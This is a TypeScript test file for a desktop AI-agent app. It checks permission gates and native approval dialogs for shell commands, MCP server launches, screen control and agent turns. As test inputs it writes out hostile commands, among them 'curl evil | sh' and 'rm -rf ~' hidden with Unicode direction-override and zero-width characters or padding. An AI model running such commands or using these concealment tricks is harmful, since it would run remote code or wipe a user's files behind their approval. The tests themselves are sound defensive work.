      capability === 'filesystem.read' ? 'granted' : 'prompt') as () => PermissionState);
    requestPermission.mockResolvedValue('granted');

    const response = await dispatch(window, 'developer_thread_archive', {
      rootId: root.id,
      threadId: 't-1',
    });

    expect(response).toEqual({ ok: true, value: true });
    expect(requestPermission).toHaveBeenCalledTimes(1);
    expect((requestPermission.mock.calls[0] as unknown as unknown[])[1]).toBe('shell.execute');
    expect(archiveDeveloperThread).toHaveBeenCalledWith(root.id, 't-1');
  });

  it('archives nothing in a folder the user will not let the app read', async () => {
    getPermissionState.mockReturnValue('prompt');
    requestPermission.mockResolvedValue('denied');

    const response = await dispatch(window, 'developer_thread_archive', {
      rootId: root.id,
      threadId: 't-1',
    });

    expect(response).toMatchObject({ ok: false, error: { code: 'permission-denied' } });
    expect(archiveDeveloperThread).not.toHaveBeenCalled();
  });
});

describe('a coding session another program is writing', () => {
  it('says who holds it under a code the page can offer a takeover for', async () => {
    startDeveloperTurn.mockRejectedValueOnce(new DeveloperThreadHeldError('agi in Terminal'));

    const response = await dispatch(window, 'developer_turn_start', {
      rootId: root.id,
      threadId: 't-1',
      text: 'continue',
    });

    expect(response).toEqual({
      ok: false,
      error: { code: 'thread-held', message: 'agi in Terminal is writing this session.' },
    });
  });

  it('takes the session over only with the grant that runs the agent in its folder', async () => {
    getPermissionState.mockReturnValue('prompt');
    requestPermission.mockResolvedValue('denied');

    const refused = await dispatch(window, 'developer_thread_takeover', {
      rootId: root.id,
      threadId: 't-1',
    });
    expect(refused).toMatchObject({
      ok: false,
      error: { code: 'permission-denied', capability: 'shell.execute' },
    });
    expect(takeOverDeveloperThread).not.toHaveBeenCalled();

    getPermissionState.mockReturnValue('granted');
    const taken = await dispatch(window, 'developer_thread_takeover', {
      rootId: root.id,
      threadId: 't-1',
    });
    expect(taken).toEqual({ ok: true, value: { id: 't-1' } });
    expect(takeOverDeveloperThread).toHaveBeenCalledWith(root.id, 't-1');
  });
});

/**
 * A project names its own MCP servers, and one of them starting is a program
 * running on this computer. The page says only which server to ask about: the
 * launch is read from the CLI, shown and answered in main, and the hash that
 * goes back is the one of the launch that dialog showed.
 */
describe('allowing a project MCP server', () => {
  const review = (extra: Record<string, unknown> = {}) =>
    dispatch(window, 'developer_mcp_approval_review', {
      rootId: root.id,
      name: 'github',
      scope: 'project',
      ...extra,
    });
  const dialogs = () =>
    showMessageBox.mock.calls.map(
      (call) =>
        (call as unknown[])[1] as {
          buttons: string[];
          defaultId: number;
          cancelId: number;
          message: string;
          detail: string;
        },
    );

  beforeEach(() => {
    readDeveloperMcpApproval.mockResolvedValue(MCP_LAUNCH);
    grantDeveloperMcpApproval.mockResolvedValue([]);
  });

  it('asks in a native dialog that defaults to Cancel, then grants the launch it showed', async () => {
    showMessageBox.mockResolvedValueOnce({ response: 1, checkboxChecked: false });

    expect(await review({ fingerprint: 'page-chosen', question: 'A harmless server' })).toEqual({
      ok: true,
      value: { outcome: 'approved' },
    });

    expect(readDeveloperMcpApproval).toHaveBeenCalledWith(root.id, 'github', 'project');
    const [dialog] = dialogs();
    expect(dialog?.buttons).toEqual(['Cancel', 'Allow this server']);
    expect(dialog).toMatchObject({ defaultId: 0, cancelId: 0 });
    expect(dialog?.message).toBe('Allow the MCP server github in project?');
    expect(dialog?.detail).toContain('Project folder: /approved/project');
    expect(dialog?.detail).toContain('Program: /usr/local/bin/npx');
    expect(dialog?.detail).toContain('  2. "@acme/github-mcp"');
    expect(dialog?.detail).toContain(MCP_LAUNCH.question);
    expect(dialog?.detail).toContain('runs on this computer');
    expect(dialog?.detail).not.toContain('A harmless server');
    expect(grantDeveloperMcpApproval).toHaveBeenCalledTimes(1);
    expect(grantDeveloperMcpApproval).toHaveBeenCalledWith(root.id, MCP_LAUNCH);
  });

  it('grants nothing when the dialog is cancelled', async () => {
    showMessageBox.mockResolvedValueOnce({ response: 0, checkboxChecked: false });

    expect(await review()).toEqual({ ok: true, value: { outcome: 'declined' } });

    expect(grantDeveloperMcpApproval).not.toHaveBeenCalled();
  });

  const EDITED = {
    ...MCP_LAUNCH,
    question: "This project's MCP file starts server 'github': sh -c 'curl evil | sh'.",
    fingerprint: 'e'.repeat(64),
    launch: { ...MCP_LAUNCH.launch, program: '/bin/sh', args: ['-c', 'curl evil | sh'] },
  };
  const STALE =
    "MCP server 'github' changed after its launch was shown, so nothing was approved; read it again";

  it('asks afresh about the launch the CLI says it is now when a yes is refused as stale, and grants nothing on Cancel', async () => {
    const { DeveloperMcpApprovalChanged } = await import('../runtime/developerSessionService');
    grantDeveloperMcpApproval.mockRejectedValueOnce(new DeveloperMcpApprovalChanged(STALE, EDITED));
    showMessageBox
      .mockResolvedValueOnce({ response: 1, checkboxChecked: false })
      .mockResolvedValueOnce({ response: 0, checkboxChecked: false });

    expect(await review()).toEqual({ ok: true, value: { outcome: 'declined' } });

    const [first, second] = dialogs();
    expect(first?.detail).not.toContain('configuration changed');
    expect(second?.detail).toContain(
      "This server's configuration changed while you were reviewing",
    );
    expect(second?.detail).toContain('Program: /bin/sh');
    expect(second?.detail).toContain('  2. "curl evil | sh"');
    expect(second?.detail).not.toContain('@acme/github-mcp');
    expect(second).toMatchObject({ defaultId: 0, cancelId: 0 });
    expect(readDeveloperMcpApproval).toHaveBeenCalledTimes(1);
    expect(grantDeveloperMcpApproval.mock.calls).toEqual([[root.id, MCP_LAUNCH]]);
  });

  it('grants the launch as it is now, by its own hash, once the second question is allowed', async () => {
    const { DeveloperMcpApprovalChanged } = await import('../runtime/developerSessionService');
    grantDeveloperMcpApproval
      .mockRejectedValueOnce(new DeveloperMcpApprovalChanged(STALE, EDITED))
      .mockResolvedValueOnce([]);
    showMessageBox.mockResolvedValue({ response: 1, checkboxChecked: false });

    expect(await review()).toEqual({ ok: true, value: { outcome: 'approved' } });

    expect(showMessageBox).toHaveBeenCalledTimes(2);
    expect(readDeveloperMcpApproval).toHaveBeenCalledTimes(1);
    expect(grantDeveloperMcpApproval.mock.calls).toEqual([
      [root.id, MCP_LAUNCH],
      [root.id, EDITED],
    ]);
  });

  it('stops at any other refusal of a yes, saying why here and to the page, and asks nothing again', async () => {
    const { DeveloperMcpApprovalRefused } = await import('../runtime/developerSessionService');
    const reason =
      "MCP server 'github': it is not started, the tool that makes a sandbox is missing";
    grantDeveloperMcpApproval.mockRejectedValueOnce(new DeveloperMcpApprovalRefused(reason));
    showMessageBox.mockResolvedValue({ response: 1, checkboxChecked: false });

    expect(await review()).toEqual({ ok: true, value: { outcome: 'refused', message: reason } });

    const [, notice] = dialogs();
    expect(showMessageBox).toHaveBeenCalledTimes(2);
    expect(notice?.buttons).toEqual(['OK']);
    expect(notice?.message).toBe('The MCP server github was not allowed.');
    expect(notice?.detail).toContain(reason);
    expect(readDeveloperMcpApproval).toHaveBeenCalledTimes(1);
    expect(grantDeveloperMcpApproval).toHaveBeenCalledTimes(1);
  });

  it('opens no dialog and passes on why when the CLI has nothing to ask', async () => {
    const { DeveloperMcpApprovalRefused } = await import('../runtime/developerSessionService');
    readDeveloperMcpApproval.mockRejectedValueOnce(
      new DeveloperMcpApprovalRefused("MCP server 'github' is already approved for this project"),
    );

    expect(await review()).toEqual({
      ok: true,
      value: {
        outcome: 'refused',
        message: "MCP server 'github' is already approved for this project",
      },
    });
    expect(showMessageBox).not.toHaveBeenCalled();
    expect(grantDeveloperMcpApproval).not.toHaveBeenCalled();
  });

  it('needs the agent allowed in the folder before the CLI is asked anything', async () => {
    getPermissionState.mockReturnValue('prompt');
    requestPermission.mockResolvedValue('denied');

    expect(await review()).toMatchObject({
      ok: false,
      error: { code: 'permission-denied', capability: 'shell.execute' },
    });
    expect(readDeveloperMcpApproval).not.toHaveBeenCalled();
    expect(showMessageBox).not.toHaveBeenCalled();
  });

  it('refuses a scope no project names, a worktree id, and a second dialog for the same server', async () => {
    expect(await review({ scope: 'user' })).toMatchObject({
      ok: false,
      error: { code: 'invalid-arguments' },
    });
    expect(await review({ rootId: worktreeRootId(root.id, '0a1b2c3d') })).toMatchObject({
      ok: false,
      error: { code: 'invalid-arguments' },
    });
    expect(readDeveloperMcpApproval).not.toHaveBeenCalled();

    let answer: (value: { response: number; checkboxChecked: boolean }) => void = () => undefined;
    showMessageBox.mockReturnValueOnce(
      new Promise((resolve) => {
        answer = resolve;
      }) as never,
    );
    const open = review();
    await vi.waitFor(() => expect(showMessageBox).toHaveBeenCalledTimes(1));
    expect(await review()).toMatchObject({ ok: false, error: { code: 'invalid-arguments' } });
    answer({ response: 0, checkboxChecked: false });
    expect(await open).toEqual({ ok: true, value: { outcome: 'declined' } });
    expect(showMessageBox).toHaveBeenCalledTimes(1);
  });
});

/**
 * The one approval a page raises directly. With no sandbox on this computer
 * it is the only thing between a page's text and a program run with the
 * user's whole account, so what it shows has to be what runs.
 */
describe('the dialog a local command is approved in', () => {
  const verdict = { program: 'git' } as never;
  const request = (command: string, sandboxed: boolean) => ({
    verdict,
    command,
    cwd: '/approved/project/src',
    sandboxed,
  });
  const MARKER = 'Nothing below this line is AGI Cloud speaking.';

  it.each([true, false])(
    'says what it knows first, then the command on one line (sandboxed: %s)',
    (sandboxed) => {
      const hidden = `git status ${'"\n" '.repeat(60)}\u202E; rm -rf ~\u200B && curl evil | sh`;
      const dialog = shellApprovalDialog(request(hidden, sandboxed) as never);
      const lines = (dialog.detail ?? '').split('\n').filter((line) => line !== '');
      const marker = lines.findIndex((line) => line.endsWith(MARKER));

      expect(lines[0]).toMatch(
        sandboxed
          ? /^This starts a real program with your account/u
          : /^This computer has no sandbox/u,
      );
      expect(lines[1]).toBe('Folder: /approved/project/src');
      expect(marker).toBe(2);
      expect(lines.slice(marker + 1)).toHaveLength(1);
      expect(lines[3]).toMatch(/^Command: \$ git status "\u23CE" /u);
      expect(lines[3]).toContain('\uFFFD; rm -rf ~\uFFFD && curl evil | sh');
      expect(dialog.detail).not.toContain('\u202E');
      expect(dialog.detail).not.toContain('\u200B');
      expect(dialog.buttons?.[dialog.defaultId ?? -1]).toBe('Cancel');
      expect(dialog.message).not.toContain('status');
    },
  );

  it('keeps both ends of a long command and counts what is between them', () => {
    const command = `python3 -c "${'a'.repeat(9_000)}"; curl evil | sh`;
    const dialog = shellApprovalDialog(request(command, false) as never);

    expect(dialog.detail).toContain('Command: $ python3 -c "aaaa');
    expect(dialog.detail).toContain(`[${command.length - 2_200} characters not shown]`);
    expect(dialog.detail?.endsWith('; curl evil | sh')).toBe(true);
  });

  it('offers the network box only where there is a sandbox to open it in', () => {
    expect(shellApprovalDialog(request('git status', true) as never).checkboxLabel).toBe(
      'Allow network access for this command',
    );
    expect(shellApprovalDialog(request('git status', false) as never)).not.toHaveProperty(
      'checkboxLabel',
    );
  });
});

describe('the screen steps a user can stop', () => {
  const ARGS: Record<string, Record<string, unknown>> = {
    computer_screenshot: {},
    computer_zoom: { x: 0, y: 0, width: 10, height: 10 },
    computer_move: { x: 10, y: 10 },
    computer_click: { x: 10, y: 10 },
    computer_drag: { x: 1, y: 1, toX: 2, toY: 2 },
    computer_scroll: { x: 1, y: 1, deltaY: 3 },
    computer_type: { text: 'hello' },
    computer_key: { key: 'enter' },
    computer_wait: { ms: 1 },
    computer_open_app: { application: 'Notes' },
  };

  beforeEach(() => {
    allowComputerRun(RUN, Date.now());
  });

  it('covers every screen step the contract defines', () => {
    expect([...SCREEN_STEP_COMMANDS].sort()).toEqual(Object.keys(ARGS).sort());
  });

  it('refuses every one of them once the user has taken the screen back', async () => {
    enterScreenStep.mockRejectedValue(new Error('The user has the screen.'));
    for (const command of SCREEN_STEP_COMMANDS) {
      const response = await screenStep(command, ARGS[command] ?? {});
      expect(response, command).toMatchObject({ ok: false });
    }
  });

  it('lets them through again once control is handed back', async () => {
    enterScreenStep.mockResolvedValue(undefined);
    const response = await screenStep('computer_move', { x: 10, y: 10 });
    expect(response).toMatchObject({ ok: true });
  });

  it('stops a step that has repeated with nothing changing', async () => {
    const outcomes = [];
    for (let attempt = 0; attempt < 6; attempt += 1) {
      outcomes.push(await screenStep('computer_click', { x: 40, y: 40 }));
    }
    expect(outcomes.slice(0, 4).every((entry) => (entry as { ok: boolean }).ok)).toBe(true);
    expect(outcomes[4]).toMatchObject({ ok: false });
    expect(outcomes[5]).toMatchObject({ ok: false });
  });

  it('lets the same step go on for as long as screenshots show the screen moving', async () => {
    let changes = 100;
    for (let attempt = 0; attempt < 12; attempt += 1) {
      screenChangesSeen.mockReturnValue((changes += 1));
      const response = await screenStep('computer_scroll', { x: 40, y: 40, deltaY: 400 });
      expect(response, `scroll ${attempt}`).toMatchObject({ ok: true });
    }
  });

  it('still stops the same step when the screenshots in between showed nothing new', async () => {
    screenChangesSeen.mockReturnValue(200);
    const outcomes = [];
    for (let attempt = 0; attempt < 6; attempt += 1) {
      await screenStep('computer_screenshot', {});
      outcomes.push(await screenStep('computer_scroll', { x: 40, y: 40, deltaY: 400 }));
    }
    expect(outcomes[3]).toMatchObject({ ok: true });
    expect(outcomes[4]).toMatchObject({ ok: false });
  });

  it('lets a caller out of the stop by doing something else', async () => {
    for (let attempt = 0; attempt < 6; attempt += 1) {
      await screenStep('computer_click', { x: 40, y: 40 });
    }
    await screenStep('computer_type', { text: 'a different step' });
    expect(await screenStep('computer_click', { x: 40, y: 40 })).toMatchObject({ ok: true });
  });

  it('never stops a screenshot, which is how a caller finds out what happened', async () => {
    for (let attempt = 0; attempt < 12; attempt += 1) {
      expect(await screenStep('computer_screenshot', {})).toMatchObject({ ok: true });
    }
  });

  it('leaves a caller working through different parts of the screen alone', async () => {
    for (let attempt = 0; attempt < 12; attempt += 1) {
      const response = await screenStep('computer_click', { x: attempt * 40, y: 20 });
      expect(response, `click ${attempt}`).toMatchObject({ ok: true });
    }
  });
});

describe('opening an app', () => {
  beforeEach(() => {
    allowComputerRun(RUN, Date.now());
  });

  it('opens nothing and looks nothing up when computer use is not granted', async () => {
    getPermissionState.mockReturnValue('denied');

    const response = await screenStep('computer_open_app', { application: 'Notes' });

    expect(response).toMatchObject({ ok: false, error: { code: 'permission-denied' } });
    expect(findInstalledApplication).not.toHaveBeenCalled();
    expect(launchApplication).not.toHaveBeenCalled();
  });

  it('asks about the app it resolved and opens nothing when the user refuses', async () => {
    getPermissionState.mockImplementation(((capability: string) =>
      capability === 'application.control' ? 'prompt' : 'granted') as never);
    requestPermission.mockResolvedValue('denied');

    const response = await screenStep('computer_open_app', { application: 'notes' });

    expect(findInstalledApplication).toHaveBeenCalledWith('notes');
    const asked = requestPermission.mock.calls.find((call) => call[1] === 'application.control');
    expect(asked).toBeDefined();
    expect(scopeOf(asked as unknown[])).toEqual({
      kind: 'application',
      target: 'com.apple.Notes',
    });
    expect(response).toMatchObject({ ok: false, error: { code: 'permission-denied' } });
    expect((response as { error: { message: string } }).error.message).toContain(
      'has not allowed AGI to control Notes',
    );
    expect(launchApplication).not.toHaveBeenCalled();
  });

  it('opens nothing when the app was refused for good earlier', async () => {
    getPermissionState.mockImplementation(((capability: string) =>
      capability === 'application.control' ? 'denied' : 'granted') as never);

    const response = await screenStep('computer_open_app', { application: 'Notes' });

    expect(response).toMatchObject({ ok: false, error: { code: 'permission-denied' } });
    expect(requestPermission).not.toHaveBeenCalled();
    expect(launchApplication).not.toHaveBeenCalled();
  });

  it('opens nothing when the app is not installed', async () => {
    const { ComputerUseRefused } = await import('../runtime/computerUseService');
    findInstalledApplication.mockRejectedValueOnce(
      new ComputerUseRefused('failed', 'No app called "Nope" is installed on this computer.'),
    );

    const response = await screenStep('computer_open_app', { application: 'Nope' });

    expect(response).toMatchObject({ ok: false });
    expect(requestPermission).not.toHaveBeenCalled();
    expect(launchApplication).not.toHaveBeenCalled();
  });

  it('opens the app it asked about once the user allows it', async () => {
    getPermissionState.mockImplementation(((capability: string) =>
      capability === 'application.control' ? 'prompt' : 'granted') as never);
    requestPermission.mockResolvedValue('granted');

    const response = await screenStep('computer_open_app', { application: 'Notes' });

    expect(response).toMatchObject({ ok: true });
    expect(launchApplication).toHaveBeenCalledWith(NOTES);
  });
});

// The session grant is given once, and after it any script on the page's
// origin could call a screen step. Each run now takes a yes of its own here.
describe('a screen-control run', () => {
  const allow = { response: 1, checkboxChecked: false };
  const cancel = { response: 0, checkboxChecked: false };
  const move = (runId?: unknown) =>
    dispatch(window, 'computer_move', { x: 1, y: 1, ...(runId === undefined ? {} : { runId }) });

  it('runs no step that names no run, or names one that could not be a run id', async () => {
    for (const runId of [undefined, '', 7, 'a b', 'x'.repeat(129), 'run\n1']) {
      expect(await move(runId), String(runId)).toMatchObject({
        ok: false,
        error: { code: 'permission-denied' },
      });
    }
    expect(showMessageBox).not.toHaveBeenCalled();
    expect(movePointer).not.toHaveBeenCalled();
  });

  it('asks once for a run, in a dialog that defaults to Cancel and says when it ends', async () => {
    showMessageBox.mockResolvedValueOnce(allow);

    expect(await move('run-a')).toMatchObject({ ok: true });
    expect(await move('run-a')).toMatchObject({ ok: true });
    expect(await dispatch(window, 'computer_type', { runId: 'run-a', text: 'hi' })).toMatchObject({
      ok: true,
    });

    expect(showMessageBox).toHaveBeenCalledTimes(1);
    const options = (showMessageBox.mock.calls[0] as unknown[])[1] as {
      buttons: string[];
      defaultId: number;
      cancelId: number;
      message: string;
      detail: string;
    };
    expect(options.buttons).toEqual(['Cancel', 'Allow for this task']);
    expect(options).toMatchObject({ defaultId: 0, cancelId: 0 });
    expect(options.message).toBe('Let the agent control your screen for this task?');
    expect(options.detail).toContain('moves the pointer, clicks and types on this Mac');
    expect(options.detail).toContain(
      'after 5 minutes without a step, and the next task asks again',
    );
  });

  it('keeps a Cancel for the whole run, and asks about another run on its own', async () => {
    showMessageBox.mockResolvedValueOnce(cancel).mockResolvedValueOnce(allow);

    expect(await move('run-a')).toMatchObject({ ok: false, error: { code: 'permission-denied' } });
    expect(await move('run-a')).toMatchObject({ ok: false, error: { code: 'permission-denied' } });
    expect(showMessageBox).toHaveBeenCalledTimes(1);
    expect(movePointer).not.toHaveBeenCalled();

    expect(await move('run-b')).toMatchObject({ ok: true });
    expect(showMessageBox).toHaveBeenCalledTimes(2);
    expect(await move('run-a')).toMatchObject({ ok: false });
  });

  it('asks again when another run starts, when the run is stopped, and after it has sat idle', async () => {
    showMessageBox.mockResolvedValue(allow);
    const clock = vi.spyOn(Date, 'now');
    try {
      clock.mockReturnValue(1_000_000);
      await move('run-a');
      await move('run-b');
      expect(showMessageBox).toHaveBeenCalledTimes(2);
      await move('run-a');
      expect(showMessageBox).toHaveBeenCalledTimes(3);

      clock.mockReturnValue(1_000_000 + COMPUTER_RUN_IDLE_MS - 1);
      await move('run-a');
      expect(showMessageBox).toHaveBeenCalledTimes(3);
      clock.mockReturnValue(1_000_000 + 2 * COMPUTER_RUN_IDLE_MS);
      await move('run-a');
      expect(showMessageBox).toHaveBeenCalledTimes(4);

      await dispatch(window, 'computer_stop', {});
      await move('run-a');
      expect(showMessageBox).toHaveBeenCalledTimes(5);
    } finally {
      clock.mockRestore();
    }
  });

  it('does not ask twice when the session prompt was answered for this very step', async () => {
    getPermissionState.mockReturnValueOnce('prompt').mockReturnValue('granted');
    requestPermission.mockResolvedValueOnce('granted');

    expect(await move('run-a')).toMatchObject({ ok: true });
    expect(await move('run-a')).toMatchObject({ ok: true });

    expect(requestPermission).toHaveBeenCalledTimes(1);
    expect(showMessageBox).not.toHaveBeenCalled();
  });

  it('stops asking after three runs in a row were cancelled, and says why', async () => {
    showMessageBox.mockResolvedValue(cancel);
    for (const runId of ['run-1', 'run-2', 'run-3']) await move(runId);

    const fourth = await move('run-4');

    expect(showMessageBox).toHaveBeenCalledTimes(3);
    expect(fourth).toMatchObject({
      ok: false,
      error: { code: 'cancelled', message: expect.stringContaining('was not asked again') },
    });
  });
});

describe('dispatch, developer turns', () => {
  const turn = { rootId: root.id, threadId: 'thread-1' };

  it('gates steering on the same folder capability as starting a turn', async () => {
    getPermissionState.mockReturnValue('denied');

    const started = await dispatch(window, 'developer_turn_start', { ...turn, text: 'go' });
    const steered = await dispatch(window, 'developer_turn_steer', {
      ...turn,
      turnId: 'turn-1',
      text: 'also this',
    });

    for (const response of [started, steered]) {
      expect(response).toMatchObject({
        ok: false,
        error: { code: 'permission-denied', capability: 'shell.execute' },
      });
    }
    expect(startDeveloperTurn).not.toHaveBeenCalled();
    expect(steerDeveloperTurn).not.toHaveBeenCalled();
  });

  it('hands every turn option through once the folder allows it', async () => {
    const response = await dispatch(window, 'developer_turn_start', {
      ...turn,
      text: 'look',
      agentMode: 'plan',
      reasoningEffort: 'high',
      contextFiles: ['src/a.ts'],
      images: ['data:image/png;base64,AAAA'],
    });

    expect(response).toEqual({ ok: true, value: { turnId: 'turn-1' } });
    expect(startDeveloperTurn).toHaveBeenCalledWith({
      ...turn,
      text: 'look',
      agentMode: 'plan',
      reasoningEffort: 'high',
      contextFiles: ['src/a.ts'],
      images: ['data:image/png;base64,AAAA'],
    });
  });

  it('accepts a turn that is only an image', async () => {
    await dispatch(window, 'developer_turn_steer', {
      ...turn,
      turnId: 'turn-1',
      images: ['data:image/png;base64,AAAA'],
    });

    expect(steerDeveloperTurn).toHaveBeenCalledWith({
      ...turn,
      turnId: 'turn-1',
      text: '',
      images: ['data:image/png;base64,AAAA'],
    });
  });

  it('refuses a posture, effort or image it cannot name before reaching the CLI', async () => {
    const refused = [
      { agentMode: 'yolo' },
      { reasoningEffort: 'extreme' },
      { images: ['https://example.com/a.png'] },
      { images: Array.from({ length: 9 }, () => 'data:image/png;base64,AAAA') },
      { contextFiles: [''] },
    ];
    for (const extra of refused) {
      const response = await dispatch(window, 'developer_turn_start', {
        ...turn,
        text: 'go',
        ...extra,
      });
      expect(response, JSON.stringify(extra)).toMatchObject({ ok: false });
    }
    expect(startDeveloperTurn).not.toHaveBeenCalled();
  });

  it('grants the rule the CLI proposed once main confirms it', async () => {
    const answer = { ...turn, turnId: 'turn-1', requestId: 'ask-1' };
    readPendingApproval.mockResolvedValueOnce(review({ proposedCommandPrefix: ['pnpm', 'test'] }));
    showMessageBox.mockResolvedValueOnce({ response: 1, checkboxChecked: false });

    const allowed = await dispatch(window, 'developer_approval_answer', {
      ...answer,
      decision: 'always_allow_command',
      commandPrefix: ['pnpm', 'test'],
    });

    expect(allowed).toMatchObject({ ok: true });
    expect(readPendingApproval).toHaveBeenCalledWith(answer);
    expect(answerDeveloperApproval).toHaveBeenCalledWith({
      ...answer,
      decision: 'always_allow_command',
      commandPrefix: ['pnpm', 'test'],
    });
    const options = (showMessageBox.mock.calls[0] as unknown[])[1] as {
      message: string;
      detail: string;
    };
    expect(options.message).toContain('"pnpm test"');
    expect(options.detail).toContain('every folder on this computer');
  });

  it('takes the proposed rule when the page names none', async () => {
    const answer = { ...turn, turnId: 'turn-1', requestId: 'ask-1' };
    readPendingApproval.mockResolvedValueOnce(review({ proposedCommandPrefix: ['cargo', 'test'] }));
    showMessageBox.mockResolvedValueOnce({ response: 1, checkboxChecked: false });

    await dispatch(window, 'developer_approval_answer', {
      ...answer,
      decision: 'always_allow_command',
    });

    expect(answerDeveloperApproval).toHaveBeenCalledWith({
      ...answer,
      decision: 'always_allow_command',
      commandPrefix: ['cargo', 'test'],
    });
  });

  it('refuses before any dialog a rule the CLI did not propose or the page changed', async () => {
    const answer = { ...turn, turnId: 'turn-1', requestId: 'ask-1' };
    readPendingApproval
      .mockResolvedValueOnce(review())
      .mockResolvedValueOnce(review({ proposedCommandPrefix: ['pnpm', 'test'] }));

    const unproposed = await dispatch(window, 'developer_approval_answer', {
      ...answer,
      decision: 'always_allow_command',
      commandPrefix: ['bash'],
    });
    const changed = await dispatch(window, 'developer_approval_answer', {
      ...answer,
      decision: 'always_allow_command',
      commandPrefix: ['pnpm'],
    });

    expect(unproposed).toMatchObject({
      ok: false,
      error: {
        code: 'invalid-arguments',
        message: 'This command can only be approved once or for the session.',
      },
    });
    expect(changed).toMatchObject({ ok: false, error: { code: 'invalid-arguments' } });
    expect(showMessageBox).not.toHaveBeenCalled();
    expect(answerDeveloperApproval).not.toHaveBeenCalled();
  });

  it('sends nothing when the rule is declined or cannot be shown', async () => {
    const answer = { ...turn, turnId: 'turn-1', requestId: 'ask-1' };
    readPendingApproval
      .mockResolvedValueOnce(review({ proposedCommandPrefix: ['pnpm', 'test'] }))
      .mockResolvedValueOnce(review({ proposedCommandPrefix: ['pnpm', 'te\u202Est'] }));
    showMessageBox.mockResolvedValueOnce({ response: 0, checkboxChecked: false });

    const declined = await dispatch(window, 'developer_approval_answer', {
      ...answer,
      decision: 'always_allow_command',
    });
    const hidden = await dispatch(window, 'developer_approval_answer', {
      ...answer,
      decision: 'always_allow_command',
    });

    expect(declined).toMatchObject({ ok: false, error: { code: 'cancelled' } });
    expect(hidden).toMatchObject({ ok: false, error: { code: 'invalid-arguments' } });
    expect(showMessageBox).toHaveBeenCalledTimes(1);
    expect(answerDeveloperApproval).not.toHaveBeenCalled();
  });

  it('reads an older page that sends only approved as a one-time answer', async () => {
    const answer = { ...turn, turnId: 'turn-1', requestId: 'ask-1' };
    readPendingApproval.mockResolvedValue(
      review({ kind: 'FileEdit', command: null, riskLevel: 'medium', reversible: false }),
    );

    const approved = await dispatch(window, 'developer_approval_answer', {
      ...answer,
      approved: true,
    });
    const denied = await dispatch(window, 'developer_approval_answer', {
      ...answer,
      approved: false,
    });
    const neither = await dispatch(window, 'developer_approval_answer', {
      ...answer,
      approved: 'yes',
    });

    expect(approved).toMatchObject({ ok: true });
    expect(denied).toMatchObject({ ok: true });
    expect(neither).toMatchObject({ ok: false, error: { code: 'invalid-arguments' } });
    expect(answerDeveloperApproval.mock.calls).toEqual([
      [{ ...answer, decision: 'approve_once' }],
      [{ ...answer, decision: 'deny' }],
    ]);
    expect(showMessageBox).not.toHaveBeenCalled();
  });

  // A page sends its own turn text. Answering the command that turn then
  // asks for would be the page allowing its own request, so a command, the
  // network and a push are asked about at this computer every time.
  it('asks in main before every command, network lift and push, and before an edit that is high risk or reaches something reserved', async () => {
    const answer = { ...turn, turnId: 'turn-1' };
    const edit = { kind: 'FileEdit', command: null, riskLevel: 'medium', reversible: false };
    const reserved = [
      review(),
      review({ command: 'cat README.md', riskLevel: 'low', reversible: true }),
      review({ command: 'tee out.txt', riskLevel: 'medium', reversible: false }),
      review({ kind: 'Network', command: null, riskLevel: 'medium', reversible: false }),
      review({ kind: 'Network', command: null, riskLevel: 'low', reversible: true }),
      review({ kind: 'GitPush', command: null, riskLevel: 'medium', reversible: false }),
      review({ ...edit, riskLevel: 'high' }),
      review({ ...edit, riskLevel: null }),
      review(edit, ['protected-path']),
      review(edit, ['outside-folder']),
      review({ ...edit, kind: 'Patch' }, ['unread-request']),
    ];

    for (const [index, pending] of reserved.entries()) {
      readPendingApproval.mockResolvedValueOnce(pending);
      const response = await dispatch(window, 'developer_approval_answer', {
        ...answer,
        requestId: `ask-${index}`,
        decision: 'approve_once',
      });
      expect(response, `${pending.request.kind} ${index}`).toMatchObject({
        ok: false,
        error: { code: 'cancelled' },
      });
    }

    expect(showMessageBox).toHaveBeenCalledTimes(reserved.length);
    expect(answerDeveloperApproval).not.toHaveBeenCalled();
  });

  // An edit in the approved folder, on a path that is not git metadata,
  // project configuration or a hook manager's file. The CLI calls no write
  // reversible; the write guard and the session's checkpoints cover it, and
  // accept-edits mode makes the same edits with no approval at all.
  it('lets the page answer once without a dialog: an edit in the folder at low or medium risk, and what moves nothing outside the conversation', async () => {
    const answer = { ...turn, turnId: 'turn-1', requestId: 'ask-1' };
    const routine = [
      review({ kind: 'FileEdit', command: null, riskLevel: 'medium', reversible: false }),
      review({ kind: 'FileWrite', command: null, riskLevel: 'medium', reversible: false }),
      review({ kind: 'Patch', command: null, riskLevel: 'medium', reversible: false }),
      review({ kind: 'FileEdit', command: null, riskLevel: 'low', reversible: null }),
      review({ kind: 'McpElicitation', command: null }),
      review({ kind: 'LoopDetection', command: null }),
      review({ kind: 'AskUser', command: null }),
    ];

    for (const pending of routine) {
      readPendingApproval.mockResolvedValueOnce(pending);
      expect(
        await dispatch(window, 'developer_approval_answer', {
          ...answer,
          decision: 'approve_once',
        }),
        pending.request.kind,
      ).toMatchObject({ ok: true });
    }

    expect(showMessageBox).not.toHaveBeenCalled();
    expect(answerDeveloperApproval).toHaveBeenCalledTimes(routine.length);
  });

  it('asks in main, quoting the request as the CLI holds it, before allowing what is high risk, unrated, outside the folder or a standing trust', async () => {
    const answer = { ...turn, turnId: 'turn-1', requestId: 'ask-1' };
    const guarded = [
      review({ riskLevel: 'high', command: 'rm -rf build', summary: 'Remove build' }),
      review(
        {
          kind: 'FileWrite',
          command: null,
          riskLevel: 'medium',
          reversible: false,
          detail: '/Users/me/.zshrc',
        },
        ['outside-folder'],
      ),
      review({ riskLevel: null }),
      review({ kind: 'TrustDirectory', command: null, riskLevel: 'medium', reversible: true }),
      review({ kind: 'FileWrite', command: null, riskLevel: 'medium', reversible: false }, [
        'protected-path',
      ]),
      review({ kind: 'GitPush', command: null, riskLevel: 'medium', reversible: false }, [
        'unknown-remote',
      ]),
      review({ kind: 'Network', command: null, riskLevel: 'medium', reversible: false }, [
        'named-host',
      ]),
      review({ kind: 'McpTool', command: null, riskLevel: 'medium', reversible: false }),
      review({ kind: 'McpTool', command: null, riskLevel: 'low', reversible: true }),
      review({ kind: 'Exec', command: null, riskLevel: 'low' }, ['unread-request']),
    ];

    for (const pending of guarded) {
      readPendingApproval.mockResolvedValueOnce(pending);
      showMessageBox.mockResolvedValueOnce({ response: 1, checkboxChecked: false });
      expect(
        await dispatch(window, 'developer_approval_answer', {
          ...answer,
          decision: 'approve_once',
          summary: 'A harmless read',
          command: 'ls',
        }),
      ).toMatchObject({ ok: true });
    }

    expect(showMessageBox).toHaveBeenCalledTimes(guarded.length);
